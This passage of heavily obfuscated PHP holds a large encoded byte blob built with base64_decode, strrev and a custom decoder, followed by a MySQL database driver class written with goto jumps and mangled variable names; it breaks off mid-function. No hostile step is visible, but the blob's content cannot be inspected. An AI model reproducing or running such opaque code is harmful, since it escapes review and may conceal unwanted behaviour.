åßØª°3¹ÔïÆ…¹ŸâØÊ%š$äì˜v|').base64_decode('YaYuJxKg24JHIktffszBGZEMXVjQpRnJRLSvW0e419ETYXCKPNwWgNSLYDqB').base64_decode('1QRH2Nmc4GpZhA54djPHuJCRxX7lKIJA/t6IY0jmgA1MT6ZGi5ODcFERgLui')."\xca\xa2\x11\x25\xe0\xb7\xb4\xc8\x51\x4\xc9\x2a\x14\x87\x2b\x5\x13\x50\x3f\x8a\x2a\x47\x94\xa0\x40\x29\x31\x2e\xee\x27\xba\x8c\x82\x83\x25\x7e\x31\x41\x58\xd8\x6a\xd9\x34\x5\x19"."\x5a\x35\x9a\xd\xb8\xd3\x47\xbb\x47\xbb\x7b\xc8\xee\xaf\xee\x82\x5f\xe4\x9e\x5d\xed\x18\xbf\x37\x2\x90\x1c\x55\xb3\x88\x88\xa8\x96\x20\x71\x32\xeb\x62\x4e\x23\xeb\x9\x45\xc2\x4d"."\x75\xa4\xf9\xd9\x4e\x4f\xd3\x5c\x27\x77\x79\x36\xa5\xba\x37\x9d\x92\x8\xbf\x53\x55\x5c\xe1\x2a\x2f\x96\xa8\x63\xe0\xaa\xe2\xd6\x70\xbd\x73\x62\x71\xf5\xd4\x21\x53\x6a\x91\x70\xdd"."\124\232\240\164\34\272\223\303\254\350\124\42\2\233\2\67\23\213\270\255\261\43\325\305\371\162\132\356\327\62\340\140\3\370\50\355\212\221\311\154\145\70\213\173\241"._kodDe('KB7BhVyJnPmRRHiNPaNJ91eayagDpr1qA4obx3+t1/FcD2haHZN+ho6qnwrEZw==')."\x77\x59\x6e\x2d\xf\x59\x5a\x6b\x79\x11\x11\xc6\x38\x8a\x48\xf3\x20\x76\x4f\x5a\x29\x89\x3e\x6b\x5\x1f\x5f\x4e\x48\x1\xe0\x9d\x47\xe5\x28\x24\xd\xe2\x48\x9a\xa4\x8a\x1e\xd3\x28".base64_decode('XEMEGLEiwGm2/sKpdgLaC8I/2FTgsDWVQkWsjlHt7lLts4CqwMV1in5YewGZ')."\xd\xb3\xa1\x23\x47\x27\x5c\x5f\xa7\x1a\x3f\x52\xe\xdf\xd4\x5\xbb\x1a\x23\xa0\x52\xa8\x48\x6b\x4e\x8d\xdb\x3f\x89\x2e\x6b\x9c\xb9\x1c\xfd\x60\xc1\x46\x45\x26\x80\x16\x40\x83\xf0".base64_decode('sfYs5DhgzZ2MArdT9IKsMt8VIti80ugxleMmVVLt8wvpXVMua1axIHWVONyd')."\240\170\200\173\121\245\143\203\13\156\361\17\51\44\363\151\144\73\234\42\20\113\71\336\133\213\17\136\62\120\314\155\12\136\61\221\120\25\357\44\170\1\33\141\116".base64_decode('RQtg0rhCNO3VDDksBbKaLUg7DeisvMy3SDTVyUcShUp1BMI7QUc1TlShY1WQ').base64_decode('YMaSuUxnlZApmZompeVM33CcONKoHGlMhh+qGukamzBABGdw31LwHOH+Y7AN')."\x3b\xc9\xc1\x22\x64\x17\xf4\xdd\xeb\x82\x87\x54\x30\x27\x78\x23\x8f\x80\xd3\xc8\xa6\xf6\x26\x3e\x67\xd0\x92\xca\x31\x87\xae\x59\x14\x26\x83\x68\xf1\xb7\x36\xf8\x9a\x85\x6b\x65\x21"."\41\122\133\327\34\361\264\264\24\314\40\213\205\345\133\360\366\305\325\101\275\227\307\50\340\115\121\323\355\122\14\352\215\126\25\301\324\42\311\320\143\324\11\127\221"."\x9b\xa0\x5a\x54\x80\x73\x5a\x53\x54\x52\xa5\x18\x56\x91\x12\x60\x4c\x4e\x14\xc2\xd9\xc5\x53\xa7\xb8\xd5\xa9\x6c\x3d\xb8\x5\xbf\xae\x71\xf5\x57\x97\xfb\x2\xc8\x77\xb9\xe1\x6d\x6d"."\346\102\10\0\342\215\21\112\255\347\366\372\222\64\105\226\360\124\127\25\303\253\264\104\261\224\4\107\66\323\111\231\152\257\334\114\257\55\246\270\145\61\23\156\276"."\xa0\x46\xe9\x61\xc6\x55\x75\x33\xf9\x71\x41\xc1\xb8\x27\x66\x73\xcd\x5a\x2b\x67\x66\xe6\x57\x81\x8d\xbb\x62\x85\xb2\xdc\x48\x18\xe0\x16\xdc\x2\x13\xe9\x85\xa8\x40\x68\x71\x92\x63"."\275\65\140\202\366\2\0\342\142\316\320\263\162\254\23\2\40\77\55\160\101\27\311\150\201\374\13\316\260\70\27\65\205\373\61\60\4\360\121\310\277\352\334\131\362"."\242\105\270\41\110\40\54\131\222\237\106\264\154\354\131\236\254\152\117\202\120\144\117\203\214\72\117\3\307\236\365\63\30\202\305\102\74\205\226\361\67\67\360\12\170".base64_decode('W/E4yJxHFdhQrG1esatsyRK3Sq+k24qsdV2sNI63uazlQc/JVLOCJMFeEpOX')."\xd3\xc9\xc6\x1b\xe2\x2e\xe3\x3a\xe2\xec\xea\x59\x82\xf7\xd1\x55\x55\x53\xe7\xb1\xab\x86\xf9\x34\x8f\xd2\x88\x6a\xc5\x44\xba\xdc\xfd\x49\x67\x78\x16\xb\xd6\x36\x73\x2a\x98\x1\x38".base64_decode('xiUuJMb2WL2bVXczX76iRiwOe7JZMUpfVkGi8ZQadbOdjsXlrhjXSadFEJ6x')."\245\303\173\143\133\6\124\360\105\311\335\0\127\2\242\254\303\236\16\332\142\211\54\60\305\210\351\152\326\264\340\50\374\126\107\21\362\276\334\41\167\313\270\110\221"."\x44\x1f\x1\x28\x42\xbe\x26\x8b\x0\x4e\xc2\x39\x4\x19\xf0\xae\x4c\x81\xc8\x47\xd2\x95\x54\x55\x11\xea\xae\x91\x54\x14\x50\x1f\xa1\x97\x42\x1f\x1\x15\x8b\x24\x8a\x19\xd3\x32\x9b"."\x31\xdd\xd4\xc0\xb9\xc8\x54\xb1\x89\xc3\xf3\xd6\x20\x51\x3d\xf5\x34\x93\xb\x8\x42\x71\x5d\xb0\x0\xff\x8e\xb8\x80\x2\xa\xf2\xb0\x9f\x52\x74\xac\x5f\x87\x30\xe\xba\x7c\x4a\x70".strrev('û·a“.zü²“=µw†y÷TA³ŸÍXŞJXÙ!u“Ôµ„Ş¿ñÉ').strrev('Û£ÛÃ|'."\r".'@½$N0¡TâQñúIà²H1´0Ê+¡?&s%	Ğ¾§d‚')."\301\42\313\300\137\112\151\324\225\320\350\362\362\162\147\171\5\370\237\135\60\222\117\124\226\227\347\25\51\57\257\104\377\343\14\44\225\45\23\152\315\1\373\227\42"."\32\122\240\107\121\110\207\10\232\117\253\231\34\45\230\152\241\266\273\4\173\126\125\105\166\232\311\6\0\46\23\271\370\251\244\130\140\262\300\350\115\226\320\305\26"."\211\51\366\151\140\67\206\144\175\350\111\1\267\75\15\3\312\5\254\25\232\26\72\315\124\217\1\24\343\120\0\372\341\315\304\11\113\62\31\333\233\124\211\37\163"."\321\351\25\23\305\173\46\313\127\101\71\160\130\306\130\207\141\202\40\274\200\364\224\340\331\10\106\305\313\173\224\315\354\15\120\54\305\314\330\140\264\231\265\204\375"."\334\142\235\177\62\31\5\340\54\251\365\104\370\31\10\243\323\131\14\315\15\344\154\50\104\261\131\40\23\104\261\43\205\40\172\105\115\156\274\221\141\130\247\232\262"."\130\36\105\204\266\105\47\255\0\11\101\372\227\56\57\26\303\223\17\100\272\310\305\41\3\371\316\103\257\204\140\45\230\312\41\302\334\352\32\267\377\311\173\122\207".base64_decode('xoQZpuLn0H/RsqApXpqA9RJqmXshoQF7lq2OJy689mJwv0K1zIWY6GwI3+4K')."\xb7\xfd\x6\xf1\x4c\xc9\xaf\x73\x69\x1b\xdd\x2\x8f\xe1\xca\xea\x5a\x3b\x98\x72\x43\x1c\x2b\x48\x6f\x29\x9c\xcc\x8a\xe7\x97\x2c\x50\x88\xd\x48\x2c\x27\x26\x42\x55\x22\xfa\xf0\x8"."\201\36\156\157\44\363\47\221\204\242\334\22\106\110\264\52\373\10\31\265\314\7\266\230\10\171\26\361\2\37\231\26\132\333\200\314\220\65\205\365\354\107\140\205\62"."\261\46\171\244\106\260\25\43\305\270\156\23\24\60\210\102\117\125\243\272\1\160\66\370\275\236\65\75\17\312\310\126\240\210\21\357\25\153\336\337\57\277\226\6\126".base64_decode('01Jw8EyWJYp04cAjIp8Ot0sje1ClALhYQSJv7ZHAFzZQyfCDEAMcCCVU4rS/')."\135\71\45\307\261\52\257\106\102\110\255\305\205\134\166\162\352\333\26\265\253\276\40\364\151\122\14\110\335\14\146\230\367\161\70\241\41\101\73\241\300\27\110\45\126".base64_decode('hWB1XYkBdgOiHsFOMGMGlXYx6tcYKwpl/kqBJqCVrwAecB0Ak5QTLYgFr4Ug')._kodDe('MGYUAn5IfHNVvLL21gdcNDUH92qW0Y8UyP8h+4L9/7gGhzPIZnJkQ0A3NLQqlg==')."\102\42\154\0\31\310\302\21\30\142\36\150\26\372\111\343\43\23\253\240\157\346\125\301\171\360\154\341\232\213\142\216\1\30\7\70\125\107\316\51\360\51\224\45\314".strrev(''."\n".'1Jq (C‚'."\n".']9×æDáÉ•'."\n".'˜çhÅg&íP§Ñ’$Ÿlä}Œh').base64_decode('UWci5XgZTXjvBNmwcoNCZKDLVhdZ8rKYLpwAClN1Qpaw4jbnl7dYAwoWaC2U').base64_decode('j+cLZtdZVMFsBcA+seYTZ5Rpy8N1ACosWgm2RojbUdHhJqrFx8G16kCShl1e')."\xa\x13\xc3\x2f\xa1\xb1\xe9\x2f\x55\x7\xf4\xc4\xe3\xf6\xe4\xb0\xc6\x12\xf3\x2f\xb2\x5d\x4c\x1d\x92\x18\x7e\x90\x87\x45\x4a\x4a\xa1\xe1\x87\x85\xf5\x6f\xea\x63\xa\xfc\x60\x25\x3b"."\xe1\x79\xc5\x34\xd5\xc\x31\x42\x73\x19\xa8\x1a\x96\x8\xd6\x4\xb1\xd4\x66\x49\xac\x54\x8f\x42\x6c\x38\x18\xcb\xda\xd2\xd8\xe2\x66\x49\x35\x74\x9a\x98\x29\x26\xe1\x77\xf8\x53\x15".base64_decode('RN+JGFH0gHnXegiM1lYy5Rj6EF5PWo1J/kCDr9bjr/OFZkjtiim84og0mK2b')."\37\111\160\360\342\120\310\217\62\37\253\60\350\214\2\62\315\31\147\344\251\301\11\121\101\147\106\160\56\156\155\26\303\250\242\347\265\10\310\332\264\25\75\240\72"."\120\56\125\240\164\212\213\146\204\302\131\135\311\57\337\247\240\327\354\170\217\205\12\271\2\275\41\345\13\177\1\154\21\153\151\160\170\52\231\43\165\136\315\164\253"."\x86\xca\x91\x3\xad\xd1\x27\xb6\xce\x25\x6f\x3a\x73\xfc\x2b\x4c\x7a\x5c\x74\xf6\xcb\x27\x1b\x7f\x45\xb4\xd2\xb7\xb3\x8a\x62\x9\x51\xcf\x11\x2f\x93\xe8\x5c\x23\x4b\x45\xcd\xe4\x85"."\6\346\220\24\107\5\257\312\131\135\126\15\105\110\340\176\320\141\132\111\31\332\137\21\341\235\35\61\154\361\323\101\32\217\340\46\161\132\20\76\376\366\277\376\266"."\x1a\xe7\x3e\x37\x6c\x3d\x57\xe3\xf4\xfe\x9a\x69\xb1\x63\xef\xa9\xb5\xe2\x1b\x14\xb4\xb\x79\xae\xbc\xff\xab\x53\x70\x7\x17\xbe\x47\x90\x81\x3a\xd5\x2d\x44\x2f\x60\x92\x9b\x5\x76".base64_decode('axvBdto46rbrHyKHpZmY3pcVr0Pccfr8CWW0oAsRLxV0wojwuoQWj6W0HFlF')."\xaa\xf0\x6\x1b\x21\x1f\x85\xbd\xc2\x7c\x7\xe0\x82\xe0\x6d\x1\xa5\x4f\x9\x93\x6c\x0\xb4\x40\x56\xc7\x72\x49\x68\xf3\x82\x6e\xd7\x9c\xb3\x3c\xc\x97\xf7\xd\xe8\x88\xf6\xc8\xed".base64_decode('gHoS581ZAalKKkfyH64TJU2hdjf8E8gNgzedNS2sFVGPJaAJyQ3OfkAVCy3d').base64_decode('l5dgYdv9tBtMNQtCdyahiaNGWBMcPvipBaiOjEOYd3MAalox855HIO0csVHD')."\176\356\160\212\10\140\222\20\340\340\71\163\102\123\4\372\307\202\311\121\104\200\152\144\143\51\130\253\320\137\50\170\247\154\0\352\257\320\340\110\374\323\106\176\351"."\x69\x60\x6f\x1a\xbb\x18\x16\x9e\x9d\x8d\xa0\x57\x68\xf3\x32\x9b\x14\xce\x39\x91\xbe\x3a\x6c\xe7\x10\xbc\xec\x96\x33\xc\xd1\x11\xcf\xe7\xc\xc1\xf0\x1d\x47\xf3\x4\xf0\x61\x37\x50"."\x4c\x3b\x9\x69\x89\x89\x7e\xa2\xc3\x5a\x58\x6e\x77\x60\x82\x6\xe2\xd\x1e\xab\xe9\x13\xc3\xa2\x92\x1e\xea\x17\xc8\xa4\x82\x87\x38\x5b\xa1\xa9\x42\x1\xfa\xac\x41\xdc\x81\x7c\xee"."\143\354\141\177\267\101\0\147\206\222\304\332\355\51\55\52\247\202\130\255\305\242\51\256\3\326\204\51\255\131\212\21\204\42\147\263\107\24\201\343\104\42\16\317\145"."\174\330\326\310\222\252\13\254\217\250\46\211\5\377\334\314\202\24\7\137\153\301\222\176\62\154\261\111\172\333\202\176\40\163\124\57\274\126\346\316\277\235\201\152\67"."\144\67\212\372\151\344\322\314\45\362\46\244\200\64\105\342\13\154\331\100\220\356\203\273\22\5\320\256\24\251\327\302\251\226\135\111\36\75\50\370\314\7\172\123\2".strrev('ppEŞAÁ~…ìWàÊïäÃÀà£½†~€{k£~KËEç8Ã×F	)Ôÿ').base64_decode('25kfeymEP1lkfecI9jksDtlCYNtpazZvtgpB+9yGtXzZFb+gyuTS/E4QRKy8').strrev('œ¯zú·kÿÔN¶¿÷ff¸°ñrñÆ`}tÛ³¨9Ï]”ôæ…€ŞF')."\325\351\145\210\275\230\152\1\116\300\336\163\35\165\354\215\51\317\245\373\234\164\174\364\230\161\223\104\206\236\257\34\277\144\40\36\375\210\303\53\162\323\101\316\141"."\16\22\222\360\161\350\1\212\172\202\22\167\71\312\264\52\150\346\277\160\42\0\257\25\57\377\357\66\11\47\210\161\121\101\161\62\377\55\245\274\51\101\360\52\50"."\x19\x8\x87\x94\xed\x8a\x58\x83\x37\xb7\x6\xef\x2c\x3e\x68\xf8\xfe\xb6\x7e\xb\xbf\xb7\x53\x60\x1c\x2\x8\xf1\x4d\x83\x9f\xd5\xd0\x52\x90\xb5\x84\xef\xc5\x43\x57\x12\x56\x1e\xa9"."\x10\x2b\x80\x66\x82\xf2\x1d\x2a\x7a\xb8\x4b\xb1\xf7\x1d\x4d\xc\x11\x22\xf0\x6c\x81\x57\x10\x5b\x34\x35\xbb\x3c\x4\x56\x87\xe7\x19\xb2\x84\x8\x64\x52\xe4\x0\x85\xe6\x83\x7c\xfb"."\xfd\xdf\x16\x90\xb2\x3\x98\xa3\xe0\xca\x2\x5\x46\xee\x9e\x46\x51\x8c\xed\x59\x12\xdb\x9b\x52\x3f\xd2\x6f\x4c\x3b\x31\xd6\xc7\x29\x9b\x4e\x1\x34\x5\x19\x9a\x62\x6\xd0\x2\xe3"."\xa8\xc0\x89\x59\xc7\x6a\x6b\x1e\x54\xe3\x6d\xcc\x77\x48\x47\x2a\x24\x80\x15\xf7\xa0\x20\x10\x4d\xb0\x2c\xb5\x53\x3a\x2\xdb\x4a\xb1\x16\x7f\x58\x2\x59\xa7\x70\x31\x30\xda\x99\x96".base64_decode('XSr4VRONPVBDItDnN40kIaS/ZJuid7CRDoWngdnryILmBpwo4bkgTQxbTV8D')."\324\53\26\240\234\54\74\23\210\163\217\142\2\252\211\333\22\351\370\321\256\316\337\202\107\142\27\105\313\60\13\115\317\236\150\260\320\370\206\375\255\22\100\204\211"."\76\346\100\224\175\222\234\262\4\11\42\305\132\374\65\207\375\225\261\254\140\6\53\274\34\150\173\22\320\372\136\140\122\354\26\164\4\140\333\345\324\64\17\132\72"."\xe2\xab\xd\x5c\x0\x3b\x25\xc3\x61\x4a\x6c\xff\x3f\xbf\x3a\xf6\xff\xf3\xb1\x31\xa6\xdb\xdd\x40\x88\x61\x5b\x1f\xad\xa7\xe1\x89\x62\x2e\x1\x4f\x87\x25\x46\x22\x9c\xf8\x87\xc7\x8c"."\x4b\x78\x38\xb\xc5\x99\x16\x21\x75\xa\x41\x7d\x45\xc8\xec\x9e\x2\xde\xf8\x30\xfe\x1f\x8b\x54\x49\x11\xf8\x46\x4b\x9e\x84\x92\xbe\x65\x4\x0\xb5\x93\x3d\xbd\x53\x28\x92\xff\x5c"."\234\5\344\50\155\312\7\220\121\143\235\5\156\304\340\304\373\255\336\371\4\122\41\257\30\107\122\200\242\240\16\62\334\64\204\270\52\110\151\122\334\50\132\210\5"."\xb2\x94\xfb\x2a\x25\xe8\x78\xfe\x34\x8a\x55\x90\xd\x29\x41\x2e\x22\x42\xb1\x24\xe5\xa1\xa1\xb0\xe5\x28\xb4\x24\x8a\xd3\xc3\xdf\x30\x74\x59\x5f\xf9\x23\x35\x9a\x6c\x2f\xcb\xe0\x42"."\26\327\215\26\161\162\376\5\151\176\155\266\205\305\52\120\337\322\52\165\141\117\317\225\333\337\242\253\160\346\177\14\253\73\103\331\100\20\162\357\56\333\7\331\306"."\x2a\xb8\x8b\xd8\x1b\x7f\x2\x8b\xa\x42\x62\xd7\xe9\x6e\x6c\xd1\x35\x44\x5a\x59\x53\x99\xb0\x41\x50\x43\x13\x70\x62\xde\x83\x4c\x36\x21\x3c\xe0\x8a\x84\x3b\x2a\xec\x3e\x9\xbb\xec".base64_decode('hN5hAAqUQq1NJUgHHybAAHGGRyi9hdIQSfiDPbaUwGzYyEL48CfzgVcqcc8i')."\xa2\x5f\x50\x28\xdb\x15\x9e\x13\x35\xd3\x59\x2c\xf5\x22\xf3\x81\xd\x67\x2c\xb2\x25\x43\x74\x93\x6b\xb5\xaf\x11\x14\x56\xad\x19\x50\xc3\xd8\xba\x9f\xa6\x16\x2a\x16\xd3\x74\x43\x28"."\306\322\13\225\205\317\151\231\226\205\342\316\122\355\116\122\21\163\215\371\145\13\333\114\356\32\305\44\341\52\16\120\302\161\253\236\43\312\104\311\324\75\23\175\125"."\x96\x5f\x1f\x59\xef\xf2\x98\x97\xca\x3c\x7c\x96\x53\xfd\x42\x36\xaa\x45\x9d\x7b\x80\x5f\x68\x46\xe4\xe3\x76\xd4\x28\x1b\xb\xbd\x3d\xdd\xb2\x49\x6f\xc4\xec\xb5\x5a\x2d\x6c\x87\x70"."\363\27\103\140\351\315\277\316\341\267\114\2\345\100\253\101\276\205\143\144\133\272\160\170\160\234\50\167\363\33\34\116\50\307\343\354\335\103\113\121\366\2\71\113\5"."\x29\xfc\x89\x44\x48\x28\x9\x96\x89\x5c\xbf\x55\xe9\xb1\x3f\xda\xe5\x12\xad\x19\x2d\x5\xf3\x53\xb9\xe5\xa2\x7d\x5c\x68\x2f\x58\x4c\x28\x5d\xa2\xc9\x23\x83\x16\x9e\x84\x9d\xe0\x32"."\x45\x11\x81\xdb\x80\x3a\xda\x5c\x83\x4\xf7\x91\x71\xd9\xfc\x93\x56\x3\x4b\x56\x8c\x2d\x6\x28\x83\x34\xe2\x9d\x96\x54\x1b\xff\x4\x65\x16\xf4\x10\xb5\x65\x19\xe2\x5b\x8d\xd6\xbb"."\x39\x91\xed\x17\xd6\x56\x49\xf9\x85\xe6\xc4\x7b\xbb\x23\x56\x8\x15\xfe\x8\x7\x37\xeb\x14\xb\x26\xab\x3c\x83\x9e\x55\x62\x2b\x16\x4\xc9\x6\x46\x4a\x6\xc5\x4c\x4b\x77\xec\x4b"."\213\230\1\16\227\70\61\215\4\233\56\52\23\316\57\257\330\172\57\126\260\217\14\327\320\363\346\207\324\51\374\151\373\7\350\364\330\31\56\336\210\300\352\344\335"."\xea\x87\xb5\x2\x75\x70\x8f\xa\x56\xc3\x59\xe8\xf1\x5f\x46\x8c\x59\xea\x1a\x3d\xaa\x19\x4b\x16\xac\x8b\xb3\x60\xdd\xbc\x6c\x5a\x59\x90\x54\x8\xf5\x4c\x39\x67\x1c\x61\x78\xf9\x93"."\107\230\366\170\201\1\333\130\133\134\364\110\363\131\260\160\376\347\10\360\330\113\43\56\277\160\57\70\163\156\273\53\55\324\213\202\205\217\330\213\2\57\236\22\137"."\124\5\360\41\315\51\200\1\371\305\172\76\256\345\171\5\256\371\161\233\360\34\25\35\242\24\310\26\165\6\12\153\25\4\13\356\142\303\172\335\157\113\27\47\206"."\353\16\21\155\242\316\14\65\221\0\325\271\106\24\124\170\144\157\146\262\366\160\64\117\273\224\302\136\46\47\150\62\26\124\117\165\240\167\222\363\130\315\24\175\64"."\103\324\354\305\14\206\146\252\61\101\303\310\376\362\63\316\247\37\111\161\201\331\247\217\136\266\347\311\173\367\154\270\143\317\65\227\357\276\366\46\307\300\212\273\7"."\156\275\222\373\336\105\31\3\277\371\365\336\233\257\231\54\15\134\371\113\230\271\146\331\256\77\74\212\377\335\175\327\23\237\156\170\12\272\355\105\105\166\157\174\342".strrev('…«8¾<‰¢|iıÑeÅĞp’„4_\'¸‹\'™8b¸noãp6<Wwş¹ïwÓ')."\267\251\354\62\6\262\125\16\174\120\342\154\370\256\265\3\346\205\265\54\372\255\321\114\223\342\35\100\352\332\336\207\27\224\23\100\210\337\274\300\45\101\227\1\10"."\170\21\222\101\101\162\205\7\131\320\220\202\163\21\152\262\104\340\45\3\213\4\363\157\23\352\163\266\313\103\236\0\230\307\250\326\113\275\222\101\263\115\336\37\376"._kodDe('MJVcFVqmu+54TO/DPwfwCLWKXBTRS9yWixX7CN9/wKVbtULbLLiHfc0uo4Hyqg==')."\x9\xec\xf2\x11\x49\x99\xa0\x3\x54\xef\x6c\x5f\x28\x1c\xca\xcb\x6a\xf1\x84\x42\xb3\x2\xc1\x3a\xec\x21\x32\x2f\x1b\xd5\x12\xb4\x5a\xf2\xb2\x5a\x1a\x3\xcd\x47\xca\xf3\x36\x79\x7c"."\xfe\xbc\x3c\xa8\xe5\xd2\x1c\xe1\x8e\x6c\x70\x96\xaf\x5\xf5\xd2\xe3\xf7\x7\x66\x1d\xa9\x17\xbe\xda\x19\xbc\x27\xe8\xae\x94\x4b\xbe\xb3\x49\x8d\x8a\xb1\xe9\x5\x41\x48\x4e\x51\x1e"."\132\60\347\122\322\334\243\21\257\143\25\15\210\353\152\120\327\136\54\140\365\245\156\123\70\243\0\113\32\202\32\52\315\244\355\140\226\244\102\217\231\14\123\60\362"."\27\15\110\263\351\255\343\333\140\227\345\326\130\110\107\233\105\170\327\35\363\7\302\131\214\22\312\12\316\230\170\273\233\57\314\107\271\174\106\140\117\247\153\104\47"."\xaa\x43\x8b\xa\x92\x42\xcc\x8d\x10\xbb\x2a\x32\xc7\x82\x5a\x12\xe\x93\xec\xff\x1\xa8\x1c\x63\x2c\x8a\x99\x0\x0"."".""."", 10, -8))); goto cÎ„µÎì°ä; FÙ©İ—È¶‚: class DbMysqli extends Db { public function __construct($F¾êÈªÌ÷Œ = '') { $FœÖ¥ßÌÊ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!extension_loaded($FœÖ¥ßÌÊ[720])) { think_exception(think_lang($FœÖ¥ßÌÊ[10]) . $FœÖ¥ßÌÊ[824]); } if (!empty($F¾êÈªÌ÷Œ)) { $this->config = $F¾êÈªÌ÷Œ; if (empty($this->config[$FœÖ¥ßÌÊ[13]])) { $this->config[$FœÖ¥ßÌÊ[13]] = $FœÖ¥ßÌÊ[33]; } } } public function connect($E‰ª²À¶ = '', $EùŞÌÓÎå = 0) { $C‘’·æ×… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!isset($this->linkID[$EùŞÌÓÎå])) { goto b—÷ù»õë£; DÚ°óâÊ–ó: $Bø‰Œ˜ïÓÄ = $this->linkID[$EùŞÌÓÎå]->server_version; $this->linkID[$EùŞÌÓÎå]->query($C‘’·æ×…[802] . think_config($C‘’·æ×…[803]) . $C‘’·æ×…[55]); if ($Bø‰Œ˜ïÓÄ > $C‘’·æ×…[804]) { $this->linkID[$EùŞÌÓÎå]->query($C‘’·æ×…[805]); } goto c”ôÓÏõ”; b—÷ù»õë£: if (empty($E‰ª²À¶)) { $E‰ª²À¶ = $this->config; } $this->linkID[$EùŞÌÓÎå] = new mysqli($E‰ª²À¶[$C‘’·æ×…[798]], $E‰ª²À¶[$C‘’·æ×…[800]], $E‰ª²À¶[$C‘’·æ×…[801]], $E‰ª²À¶[$C‘’·æ×…[17]], $E‰ª²À¶[$C‘’·æ×…[799]] ? intval($E‰ª²À¶[$C‘’·æ×…[799]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto DÚ°óâÊ–ó; c”ôÓÏõ”: $this->connected = !0; if (1 != think_config($C‘’·æ×…[18])) { unset($this->config); } goto c¤Îº¾ˆ­ò; c¤Îº¾ˆ­ò: } return $this->linkID[$EùŞÌÓÎå]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($b¶±²†˜Õº) { goto a…ÎµÖİãÔ; a…ÎµÖİãÔ: $BŠ™³¿İÁÓ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eé›İœÅÖ¯; Fµ¤¸‘ĞÉ³: think_status($BŠ™³¿İÁÓ[20]); $this->queryID = $this->_linkID->query($b¶±²†˜Õº); if ($this->_linkID->more_results()) { while (($Cï ùÑ›Ö = $this->_linkID->next_result()) != NULL) { $Cï ùÑ›Ö->free_result(); } } goto e¤­’ŠŸÔÇ; eé›İœÅÖ¯: $this->queryStr = $b¶±²†˜Õº; if ($this->queryID) { $this->free(); } think_action_status($BŠ™³¿İÁÓ[19], 1); goto Fµ¤¸‘ĞÉ³; e¤­’ŠŸÔÇ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto F¨éğœ†Í; F¨éğœ†Í: } public function execute($c•Ê‡¹Ã›£) { goto CğõĞñáê¿; dùÊÃ£Îí§: think_status($F’Å‰¯àšß[20]); $E‘±Š™¹¤¹ = $this->_linkID->query($c•Ê‡¹Ã›£); $this->debug(); goto BÄÕÖ…à´Ã; CğõĞñáê¿: $F’Å‰¯àšß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A½ŸÙåŸ†™; BÄÕÖ…à´Ã: if (!1 === $E‘±Š™¹¤¹) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aõ˜¤¦¯±«; A½ŸÙåŸ†™: $this->queryStr = $c•Ê‡¹Ã›£; if ($this->queryID) { $this->free(); } think_action_status($F’Å‰¯àšß[21], 1); goto dùÊÃ£Îí§; aõ˜¤¦¯±«: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eøÏ™æà›ñ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$eøÏ™æà›ñ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FŒš¾¼‰™§ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FŒš¾¼‰™§) { $this->error(); return !1; } } return !0; } private function getAll() { $cÌƒ‰¤Òì = array(); if ($this->numRows > 0) { for ($aŸĞÖšÁÖã = 0; $aŸĞÖšÁÖã < $this->numRows; $aŸĞÖšÁÖã++) { $cÌƒ‰¤Òì[$aŸĞÖšÁÖã] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $cÌƒ‰¤Òì; } public function getFields($B²šƒËåáë) { $AÜó»Òõ¸‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A”ĞÜíñ× = $this->query($AÜó»Òõ¸‰[809] . $this->parseKey($B²šƒËåáë)); $bà‡»ƒ…·Ò = array(); if ($A”ĞÜíñ×) { foreach ($A”ĞÜíñ× as $F…Àç—ğŞ => $Aƒïà½‹¸À) { $bà‡»ƒ…·Ò[$Aƒïà½‹¸À[$AÜó»Òõ¸‰[27]]] = array($AÜó»Òõ¸‰[28] => $Aƒïà½‹¸À[$AÜó»Òõ¸‰[27]], $AÜó»Òõ¸‰[29] => $Aƒïà½‹¸À[$AÜó»Òõ¸‰[30]], $AÜó»Òõ¸‰[31] => (bool) ($Aƒïà½‹¸À[$AÜó»Òõ¸‰[32]] === $AÜó»Òõ¸‰[33]), $AÜó»Òõ¸‰[34] => $Aƒïà½‹¸À[$AÜó»Òõ¸‰[35]], $AÜó»Òõ¸‰[36] => strtolower($Aƒïà½‹¸À[$AÜó»Òõ¸‰[37]]) == $AÜó»Òõ¸‰[38], $AÜó»Òõ¸‰[39] => strtolower($Aƒïà½‹¸À[$AÜó»Òõ¸‰[40]]) == $AÜó»Òõ¸‰[41]); } } return $bà‡»ƒ…·Ò; } public function getTables($A²³Ó«±‘â = '') { $f•¢¨÷‡Ú› =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÅİÇ†ÆÛ = !empty($A²³Ó«±‘â) ? $f•¢¨÷‡Ú›[811] . $A²³Ó«±‘â . $f•¢¨÷‡Ú›[812] : $f•¢¨÷‡Ú›[813]; $C—ñ©…öù¼ = $this->query($FÅİÇ†ÆÛ); $aÜ«­…ÂÛ­ = array(); if ($C—ñ©…öù¼) { foreach ($C—ñ©…öù¼ as $E‚£ğååàµ => $D×ö»Æ¯‚—) { $aÜ«­…ÂÛ­[$E‚£ğååàµ] = current($D×ö»Æ¯‚—); } } return $aÜ«­…ÂÛ­; } public function replace($dÁøÙå¬ƒ†, $F²¤ŠÜŸË¦ = array()) { $DÀ¤à±çÅâ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; foreach ($dÁøÙå¬ƒ† as $FÕ†»¥ì× => 